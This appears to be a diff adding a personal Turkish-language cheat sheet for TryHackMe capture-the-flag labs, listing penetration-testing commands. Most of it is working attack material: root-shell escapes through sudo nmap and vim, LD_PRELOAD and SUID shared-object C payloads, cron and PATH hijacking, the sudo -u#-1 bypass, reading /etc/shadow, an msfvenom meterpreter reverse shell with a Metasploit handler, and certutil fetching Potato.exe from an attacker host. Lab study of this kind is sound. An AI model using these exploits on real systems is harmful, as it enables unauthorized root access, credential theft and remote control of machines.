@@ -1,0 +1,126 @@
+TryHackMe
+------------
+site dir taraması: gobuster -u "url" -w wordlist.txt dir
+hesaba giriş: su - johnny"kullanıcı
+anonim ftp ile giriş: ftp 10.10.70.229"ip" (name sorunca anonymous yaz)
+get "dosya ismi"
+metadata for pdf: pdfinfo "dosya ismi"
+metadata for img: exiftool "dosya ismi"
+exploit siteleri:
+https://www.exploit-db.com/
+https://cve.mitre.org/
+https://nvd.nist.gov/vuln/search
+exploit databse: searchsploit fuel cms
+arama: find -name "dosya ismi" (*.txt ile tüm txt uzantılarını ara)
+gelişmiş arama: grep "81.143.211.90""aranıcak şey" access.log"dosya ismi"
+acces.log oluştur: wc -l access.log
+operatörler: & arkplanda && aynanda iki kod çalıştırma > çıkan outputu kullan >> aynısı ama outputu overwrite lamaz
+dinamik output: echo 
+dosya türünü anla: file "dosya adı"
+ls ile izinleri gör:ls -lh
+tipler: https://book.hacktricks.xyz/
+tipler 2: https://sushant747.gitbooks.io/total-oscp-guide/content/
+path traversal: https://book.hacktricks.xyz/pentesting-web/file-inclusion
+bul: locate "dosya ismi"
+bu kullanıcı için olan dosyaları bul: find / -user "kullanıcı adı"
+reverse shell: https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
+nc ile dinle (reverse shell): nc -nvlp "port"
+
+server klasörüne at: cp "dosya adı" /var/www/html
+serverı başlat: service apache start
+targettan indir: wget http/"target ip"/"dosya adı"
+
+tarama: nikto -h http://"ip"
+kullanıcıları öğrenme: cat /etc/passwd
+
+sistemi öğren: uname -a
+çalışan şeyleri görme: ps aux
+network bakma: ip route
+ip mac gör: arp -a
+gelişmiş aratma: find / -name password 2> /dev/null
+kayıtlı ssh serverları görme: find / -name id_rsa 2> /dev/null
+şifre ara: find . -type f -exec grep -i -I "PASSWORD" {} /dev/null \;
+root olmadan root ile çalıştırabilirsin: sudo -l
+nmap ile root olma: 1)sudo /usr/bin/nmap --interactive 2)!sh
+vim ile root olma: sudo /usr/bin/vim -c '!/bin/sh'
+apache2 ile şifre bulma: sudo /usr/sbin/apache2 -f /etc/shadow
+passwd e shadow bulursan: unshadow passwd.txt"passwd" shadow.txt"shadow" 
+john ile şifre kırma:john --wordlist=wordlist"wordlist dosyası" password"şifre dosyası" 
+kırdığını görme: john -show password"şifre dosyası"
+ld_preload açığı: 
+1) sudo -l yapınca env_keep+=LD-Preload ise yapılabilir 
+2)
+#include <stdio.h>
+#include <sys/types.h>
+#include <stdlib.h>
+
+void _init(){
+        unsetenv("LD_PRELOAD");
+        setgid(0);
+        setuid(0);
+        system("/bin/bash"); 
+}
+3)çalıştıralabilir yap: gcc -fPIC -shared -o /home/user/library.so"c dosyası" library.c -nostartfiles
+4)sudo LD_PRELOAD=/home/user/library.so"so dosyası" nmap
+
+suid yetki yükseltme:
+1) find / -type f -perm -04000 -ls 2>/dev/null
+2)  strace /usr/local/bin/suid-so 2>&1 | grep -i -E "open|access|no such file"
+3)#include <stdio.h> #include <stdlib.h>
+
+static void inject() __attribute__((constructor));
+
+void inject() {
+system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
+
+} 
+4) gcc -shared -o /home/user/.config/libcalc.so -fPIC /home/user/.config/libcalc.c
+file permission suid binary (apache service çalışıyorsa suid ile): 
+1) echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0;} ' > /tmp/service.c
+2) gcc /tmp/service.c -o /tmp/service
+3) export PATH=/tmp:$PATH
+Cron açığı
+1) locate cron.d
+2) ls -la /etc/cron.d
+3) cat /etc/crontab
+4) cronda çalışıp olmayan bir dosya varsa biliyorsun ne yapacağını
+5) echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
+6) chmod +x /home/user/overwrite.sh 
+7) bekledikten sonra: /tmp/bash/ -p
+sudo<1.8.28: sudo -u#-1 /bin/bash
+
+ftp ile dosya yükle: 
+1) ftp "ip"
+2) put "dosya adı"
+3) msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.1"ip" LPORT=4242"port" -f aspx > reverse.aspx
+(windows için aspx)
+4)msfconsole
+5) use exploit/multi/handler
+6) set payload windows/meterpreter/reverse_tcp
+7) set LHOST "IP"
+8) set LPORT "port"
+9) exploit -j -z
+10) sessions -1
+-------------------
+windows shell komutları:
+sistem info: systeminfo
+host isimlerine bak: hostname
+kimiz: whoami
+yekilermizi gör: whoami /priv
+grupları gör: whoami /groups
+içinde pasword yazan txtler: findstr /si password *.txt
+güvenlik duvarına bak: netsh advfirewall firewall
+meterpreter shell ile exploitlere bak:
+1) getsystem
+2) run post/multi/recon/local_exploit_suggester
+winpeas ile exploit bulma:
+1) cd c:\\windows\\temp
+2) upload /root/Downloads/winpeas.exe
+3) winpeas.exe
+potato attack: 
+1) whoami /priv (impersonateprivliligae enabled mı?)
+2) service apache2 start (var/www/html içine koy dosyayı)
+2.5) shell
+3) certutil -urlcache -f http://"ip"/Potato.exe pot.exe
+gizleme veya x64 geçme: migrate "pid"
+güzel crack site: https://crackstation.net/
